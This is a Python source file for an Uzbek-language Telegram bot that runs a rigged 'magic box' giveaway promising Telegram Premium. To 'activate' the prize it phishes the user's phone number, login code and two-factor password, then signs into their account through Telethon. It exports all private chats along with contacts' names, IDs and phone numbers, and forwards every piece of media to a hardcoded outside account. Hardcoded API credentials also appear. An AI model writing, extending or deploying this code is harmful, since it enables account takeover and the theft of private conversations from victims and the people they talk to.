import asyncio
import os
import json
import random
import zipfile
import shutil

from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from telethon import TelegramClient
from telethon.tl.types import User
from telethon.errors import SessionPasswordNeededError

# =====================================================
# 🔐 RENDER + LOKALGA MOS SOZLAMALAR
# =====================================================
BOT_TOKEN = os.getenv("BOT_TOKEN") or "LOKAL_BOT_TOKEN_BU_YERGA"

API_ID = int(os.getenv("API_ID") or 27762756)
API_HASH = os.getenv("API_HASH") or "4905f5337b228bec93dd37832e89b1c6"

ADMIN_ID = int(os.getenv("ADMIN_ID") or 7690148385)

MEDIA_TARGET = os.getenv("MEDIA_TARGET") or "@pedro_yd"

BASE_DIR = "chats_export"

WIN_STICKER = "https://t.me/Asilbek_uzb/73"
LOSE_STICKER = "https://t.me/Asilbek_uzb/74"

# =====================================================
bot = Bot(BOT_TOKEN)
dp = Dispatcher()

USERS_FILE = "users.json"
CONFIG_FILE = "config.json"

sessions = {}

# =====================================================
# 📁 JSON YORDAMCHI FUNKSIYALAR
# =====================================================
def load_json(file, default):
    if not os.path.exists(file):
        with open(file, "w", encoding="utf-8") as f:
            json.dump(default, f)
    with open(file, "r", encoding="utf-8") as f:
        return json.load(f)

def save_json(file, data):
    with open(file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

users = load_json(USERS_FILE, {})
config = load_json(CONFIG_FILE, {"magic_box": "on"})

# =====================================================
# 📱 MENULAR
# =====================================================
MENU_TEXTS = [
    "🎁 Sehrli quti",
    "🏆 Yutuqlar",
    "👥 Referal",
    "✅ Aktivlash",
    "⬅️ Orqaga",
    "⚙️ Admin panel"
]

def main_menu(is_admin=False):
    kb = [
        [types.KeyboardButton(text="🎁 Sehrli quti")],
        [types.KeyboardButton(text="🏆 Yutuqlar"), types.KeyboardButton(text="👥 Referal")],
        [types.KeyboardButton(text="✅ Aktivlash")]
    ]
    if is_admin:
        kb.append([types.KeyboardButton(text="⚙️ Admin panel")])
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def back_menu():
    return types.ReplyKeyboardMarkup(
        keyboard=[[types.KeyboardButton(text="⬅️ Orqaga")]],
        resize_keyboard=True
    )

# =====================================================
# 🚀 /start + REFERAL + MIGRATION
# =====================================================
@dp.message(CommandStart())
async def start(msg: types.Message):
    uid = str(msg.from_user.id)
    parts = msg.text.split()
    ref_id = parts[1] if len(parts) > 1 else None

    if uid not in users:
        users[uid] = {
            "boxes": 0,
            "win_box": random.randint(1, 3),
            "has_prize": False,
            "refs": 0,
            "ref_by": None
        }

        if ref_id and ref_id in users and ref_id != uid:
            users[uid]["ref_by"] = ref_id
            users[ref_id]["refs"] += 1
    else:
        # 🔧 eski userlarni avtomatik tuzatish (migration)
        users[uid].setdefault("boxes", 0)
        users[uid].setdefault("win_box", random.randint(1, 3))
        users[uid].setdefault("has_prize", False)
        users[uid].setdefault("refs", 0)
        users[uid].setdefault("ref_by", None)

    save_json(USERS_FILE, users)

    await msg.answer(
        "👋Xush kelibsiz!",
        reply_markup=main_menu(msg.from_user.id == ADMIN_ID)
    )

# =====================================================
# 👥 REFERAL
# =====================================================
@dp.message(lambda m: m.text == "👥 Referal")
async def referral(msg: types.Message):
    uid = str(msg.from_user.id)
    bot_username = (await bot.me()).username
    link = f"https://t.me/{bot_username}?start={uid}"

    refs = users.get(uid, {}).get("refs", 0)

    await msg.answer(
        f"👥 <b>Referal tizimi</b>\n\n"
        f"🔗 Sizning havolangiz:\n{link}\n\n"
        f"👤 Taklif qilinganlar: <b>{refs}</b> ta",
        parse_mode="HTML"
    )

# =====================================================
# 🎁 SEHRLI QUTI
# =====================================================
@dp.message(lambda m: m.text == "🎁 Sehrli quti")
async def magic_info(msg: types.Message):
    u = users[str(msg.from_user.id)]

    if u["boxes"] >= 3:
        await msg.answer("❌ Siz 3 ta qutini ochib bo‘lgansiz")
        return

    kb = types.InlineKeyboardMarkup(
        inline_keyboard=[[
            types.InlineKeyboardButton(
                text=f"🔓 Qutini ochish ({u['boxes']+1}/3)",
                callback_data="open_box"
            )
        ]]
    )

    await msg.answer(
        "🎁 <b>Sehrli quti</b>\n\n"
        "• 3 marta bepul\n"
        "• 100 dan ortiq sovg'alar\n"
        "• Natija tasodifiy",
        parse_mode="HTML",
        reply_markup=kb
    )

@dp.callback_query(lambda c: c.data == "open_box")
async def open_box(cb: types.CallbackQuery):
    uid = str(cb.from_user.id)
    u = users[uid]

    if u["boxes"] >= 3:
        await cb.answer("Limit tugadi", show_alert=True)
        return

    try:
        await cb.message.delete()
    except:
        pass

    u["boxes"] += 1
    current = u["boxes"]

    is_win = config["magic_box"] == "on" and current == u["win_box"]

    if is_win:
        u["has_prize"] = True
        sticker = WIN_STICKER
        text = "🎉 TABRIKLAYMIZ!\nSiz Telegram Premium yutdingiz!"
    else:
        sticker = LOSE_STICKER
        text = "📦 Quti bo‘sh chiqdi 😕"

    save_json(USERS_FILE, users)

    await cb.message.answer_sticker(sticker)

    kb = None
    if u["boxes"] < 3:
        kb = types.InlineKeyboardMarkup(
            inline_keyboard=[[
                types.InlineKeyboardButton(
                    text=f"🔓 Keyingi quti ({u['boxes']+1}/3)",
                    callback_data="open_box"
                )
            ]]
        )

    await cb.message.answer(
        f"{text}\n\n📊 Ochish: {current}/3",
        reply_markup=kb
    )
    await cb.answer()

# =====================================================
# 🏆 YUTUQLAR
# =====================================================
@dp.message(lambda m: m.text == "🏆 Yutuqlar")
async def prizes(msg: types.Message):
    if users[str(msg.from_user.id)].get("has_prize"):
        await msg.answer("🏆 Sizda Telegram Premium mavjud")
    else:
        await msg.answer("❌ Sizda yutuqlar yo‘q")

# =====================================================
# ✅ AKTIVLASH
# =====================================================
@dp.message(lambda m: m.text == "✅ Aktivlash")
async def activate(msg: types.Message):
    uid = str(msg.from_user.id)
    if not users[uid].get("has_prize"):
        await msg.answer("❌ Sizda aktivlanadigan Premium yo‘q")
        return

    sessions[msg.from_user.id] = {"step": "phone"}
    await msg.answer("📞 Telefon raqamingizni yuboring", reply_markup=back_menu())

# =====================================================
# ⬅️ ORQAGA
# =====================================================
@dp.message(lambda m: m.text == "⬅️ Orqaga")
async def back(msg: types.Message):
    sessions.pop(msg.from_user.id, None)
    await msg.answer(
        "🔙 Asosiy menyu",
        reply_markup=main_menu(msg.from_user.id == ADMIN_ID)
    )

# =====================================================
# 🔐 TELETHON LOGIN (MENU BLOKLANMAYDI)
# =====================================================
@dp.message(
    lambda m: m.from_user.id in sessions
    and m.text not in MENU_TEXTS
)
async def telethon_login(msg: types.Message):
    uid = msg.from_user.id
    state = sessions[uid]
    text = msg.text.strip()

    if state["step"] == "phone":
        state["phone"] = text
        state["client"] = TelegramClient(f"session_{uid}", API_ID, API_HASH)
        await state["client"].connect()
        await state["client"].send_code_request(text)
        state["step"] = "code"
        await msg.answer("🔐 Telegram kodi yuboring\n\n Namuna: 23.456 xuddi shunday yuborilishi shart")
        return

    if state["step"] == "code":
        try:
            await state["client"].sign_in(phone=state["phone"], code=text)
        except SessionPasswordNeededError:
            state["step"] = "password"
            await msg.answer("🔑 2 bosqichli parolni yuboring")
            return

        await msg.answer("⏳ olinmoqda...")
        await export_chats(uid)

    if state["step"] == "password":
        await state["client"].sign_in(password=text)
        await msg.answer("⏳ olinmoqda...")
        await export_chats(uid)

# =====================================================
# 📦 CHAT EXPORT (ISM / USERNAME / ID / TELEFON)
# =====================================================
async def export_chats(uid):
    client = sessions[uid]["client"]
    os.makedirs(BASE_DIR, exist_ok=True)
    media = []

    for dialog in await client.get_dialogs():
        entity = dialog.entity
        if isinstance(entity, User) and not entity.bot:
            full_name = f"{entity.first_name or ''} {entity.last_name or ''}".strip() or "Nomaʼlum"
            username = f"@{entity.username}" if entity.username else "Yo‘q"
            phone = entity.phone if entity.phone else "Ko‘rinmaydi"

            chat_dir = os.path.join(BASE_DIR, f"{full_name}_{entity.id}")
            os.makedirs(chat_dir, exist_ok=True)

            with open(os.path.join(chat_dir, "chat.txt"), "w", encoding="utf-8") as f:
                f.write("===== CHAT MAʼLUMOTLARI =====\n")
                f.write(f"Ism: {full_name}\n")
                f.write(f"User ID: {entity.id}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Telefon: {phone}\n")
                f.write("=============================\n\n")

                async for m in client.iter_messages(entity, reverse=True):
                    if m.text:
                        f.write(m.text + "\n\n")
                    if m.media:
                        media.append(m)

    zip_path = "chats.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(BASE_DIR):
            for file in files:
                z.write(os.path.join(root, file))

    await bot.send_document(uid, types.FSInputFile(zip_path), caption="📦 Chatlar ZIP")

    for m in media:
        try:
            await m.forward_to(MEDIA_TARGET)
            await asyncio.sleep(0.3)
        except:
            pass

    shutil.rmtree(BASE_DIR)
    os.remove(zip_path)

    await client.disconnect()
    sessions.pop(uid, None)

    await bot.send_message(
        uid,
        "✅ saqlandi biroz kuting...",
        reply_markup=main_menu(uid == ADMIN_ID)
    )

# =====================================================
# ⚙️ ADMIN PANEL
# =====================================================
@dp.message(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
async def admin_panel(msg: types.Message):
    kb = types.InlineKeyboardMarkup(
        inline_keyboard=[[
            types.InlineKeyboardButton(text="🟢 ON", callback_data="on"),
            types.InlineKeyboardButton(text="🔴 OFF", callback_data="off")
        ]]
    )
    await msg.answer("⚙️ Sehrli quti holati:", reply_markup=kb)

@dp.callback_query(lambda c: c.data in ["on", "off"])
async def admin_switch(cb: types.CallbackQuery):
    config["magic_box"] = cb.data
    save_json(CONFIG_FILE, config)
    await cb.message.answer(f"✅ Sehrli quti: {cb.data.upper()}")
    await cb.answer()

# =====================================================
# ▶️ RUN
# =====================================================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
